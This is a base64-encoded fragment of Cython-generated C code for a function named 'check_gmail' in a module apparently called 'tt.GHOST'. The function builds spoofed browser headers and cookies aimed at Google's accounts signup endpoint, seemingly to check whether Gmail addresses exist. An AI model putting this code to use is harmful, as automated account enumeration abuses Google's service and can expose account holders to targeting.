ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIxKSkgX19QWVhfRVJSKDAsIDEzMCwgX19weXhfTDM4X2Vycm9yKVxuICAgICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7XG4gICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzE5ID0gX19QeXhfR2V0SXRlbUludChfX3B5eF90XzIxLCAwLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAwLCAwLCAxLCAxLCBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX093blN0cm9uZ1JlZmVyZW5jZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAxMzAsIF9fcHl4X0wzOF9lcnJvcilcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE5KTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X28sIF9fcHl4X3RfMTkpO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8xOSA9IDA7XG5cbiAgICAgICAgICAgICAgICAgIFxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0w0NV90cnlfZW5kO1xuICAgICAgICAgICAgICAgIF9fcHl4X0wzOF9lcnJvcjo7XG4gICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7XG4gICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuY2hlY2tfZ21haWwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMTksICZfX3B5eF90XzIxLCAmX19weXhfdF8xMSkgPCAwKSBfX1BZWF9FUlIoMCwgMTI5LCBfX3B5eF9MNDBfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE5KTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMSk7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8yMCA9IFB5VHVwbGVfUGFjaygzLCBfX3B5eF90XzE5LCBfX3B5eF90XzIxLCBfX3B5eF90XzExKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIwKSkgX19QWVhfRVJSKDAsIDEyOSwgX19weXhfTDQwX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIwKTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTAsIF9fcHl4X3RfMjAsIE5VTEwpO1xuICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7XG4gICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMTI5LCBfX3B5eF9MNDBfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTcpO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8xOCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE3KTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgICAgICAgICAgICBpZiAoX19weXhfdF8xOCA8ICgwKSkgX19QWVhfRVJSKDAsIDEyOSwgX19weXhfTDQwX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9ICghX19weXhfdF8xOCk7XG4gICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF80KSkge1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMTkpO1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMjEpO1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZShfX3B5eF90XzE5LCBfX3B5eF90XzIxLCBfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgICAgICAgX19weXhfdF8xOSA9IDA7ICBfX3B5eF90XzIxID0gMDsgIF9fcHl4X3RfMTEgPSAwOyBcbiAgICAgICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDEyOSwgX19weXhfTDQwX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDM5X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBfX3B5eF9MNDBfZXhjZXB0X2Vycm9yOjtcbiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE2LCBfX3B5eF90XzE1LCBfX3B5eF90XzE0KTtcbiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wxMl9leGNlcHRfZXJyb3I7XG4gICAgICAgICAgICAgICAgX19weXhfTDM5X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE2LCBfX3B5eF90XzE1LCBfX3B5eF90XzE0KTtcbiAgICAgICAgICAgICAgICBfX3B5eF9MNDVfdHJ5X2VuZDo7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICBpZiAoX19weXhfdF8xMCkge1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0sIE5VTEwpO1xuICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAxMjksIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wzNztcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICBfX3B5eF9MMzc6O1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgZ290byBfX3B5eF9MNDk7XG4gICAgICAgICAgICBfX3B5eF9MMzJfZXJyb3I6O1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIGdvdG8gX19weXhfTDEyX2V4Y2VwdF9lcnJvcjtcbiAgICAgICAgICAgIF9fcHl4X0w0OTo7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgZ290byBfX3B5eF9MMTFfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICAgIH1cblxuICAgICAgICBcbiAgICAgICAgX19weXhfTDEyX2V4Y2VwdF9lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpO1xuICAgICAgICBnb3RvIF9fcHl4X0wzX2Vycm9yO1xuICAgICAgICBfX3B5eF9MMTFfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzcsIF9fcHl4X3RfOCwgX19weXhfdF85KTtcbiAgICAgICAgX19weXhfTDE1X3RyeV9lbmQ6O1xuICAgICAgfVxuXG4gICAgICBcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdl9vKSkgeyBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKCJvIik7IF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKSB9XG4gICAgICBfX3B5eF90XzEyID0gX19weXhfdl9vO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X181fTtcbiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BsaXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgyLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIH1cbiAgICAgIGlmICgobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChfX3B5eF90XzYpKSkgfHwgKFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X3RfNikpKSB7XG4gICAgICAgIFB5T2JqZWN0KiBzZXF1ZW5jZSA9IF9fcHl4X3RfNjtcbiAgICAgICAgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcXVlbmNlKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgIT0gMikpIHtcbiAgICAgICAgICBpZiAoc2l6ZSA+IDIpIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKDIpO1xuICAgICAgICAgIGVsc2UgaWYgKHNpemUgPj0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKHNpemUpO1xuICAgICAgICAgIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICB9XG4gICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBpZiAobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChzZXF1ZW5jZSkpKSB7XG4gICAgICAgICAgX19weXhfdF8xMiA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDApO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEyKTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAxKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWZGYXN0KHNlcXVlbmNlLCAwLCBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX1NoYXJlZFJlZmVyZW5jZSk7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZkZhc3Qoc2VxdWVuY2UsIDEsIF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfU2hhcmVkUmVmZXJlbmNlKTtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgfVxuICAgICAgICAjZWxzZVxuICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbmNlLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbmNlLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIFB5X3NzaXplX3QgaW5kZXggPSAtMTtcbiAgICAgICAgX19weXhfdF8xMSA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDEzMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIF9fcHl4X3RfMjIgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzExKTtcbiAgICAgICAgaW5kZXggPSAwOyBfX3B5eF90XzEyID0gX19weXhfdF8yMihfX3B5eF90XzExKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgZ290byBfX3B5eF9MNTBfdW5wYWNraW5nX2ZhaWxlZDtcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICBpbmRleCA9IDE7IF9fcHl4X3RfNSA9IF9fcHl4X3RfMjIoX19weXhfdF8xMSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgZ290byBfX3B5eF9MNTBfdW5wYWNraW5nX2ZhaWxlZDtcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIGlmIChfX1B5eF9JdGVybmV4dFVucGFja0VuZENoZWNrKF9fcHl4X3RfMjIoX19weXhfdF8xMSksIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19weXhfdF8yMiA9IE5VTEw7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDUxX3VucGFja2luZ19kb25lO1xuICAgICAgICBfX3B5eF9MNTBfdW5wYWNraW5nX2ZhaWxlZDo7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIF9fcHl4X3RfMjIgPSBOVUxMO1xuICAgICAgICBpZiAoX19QeXhfSXRlckZpbmlzaCgpID09IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihpbmRleCk7XG4gICAgICAgIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF9MNTFfdW5wYWNraW5nX2RvbmU6O1xuICAgICAgfVxuICAgICAgX19weXhfdl90bCA9IF9fcHl4X3RfMTI7XG4gICAgICBfX3B5eF90XzEyID0gMDtcbiAgICAgIF9fcHl4X3ZfaG9zdCA9IF9fcHl4X3RfNTtcbiAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF82ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0hvc3RfR0FQUywgX19weXhfdl9ob3N0KSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF92X2Nvb2tpZXMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF82ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoOCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEzNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdXRob3JpdHksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjb3VudHNfZ29vZ2xlX2NvbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FjY2VwdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NlcHRfbGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fVVNfZW5fcV8wXzkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTM1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY29udGVudF90eXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dvb2dsZV9hY2NvdW50c194c3JmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTM1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcmlnaW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzUsIF9fcHl4X0wzX2Vycm9yKVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3RsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTQxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cF8yLCBfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTQxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlZmVyZXIsIF9fcHl4X3RfMTIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTM1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnYik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNDIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19weXhfdF8xMyA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMSkpKSB7XG4gICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTEpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzExKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTEsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIE5VTEx9O1xuICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8IChfX3B5eF90XzEzKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxNDIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICB9XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3VzZXJfYWdlbnQsIF9fcHl4X3RfMTIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTM1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF82ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmI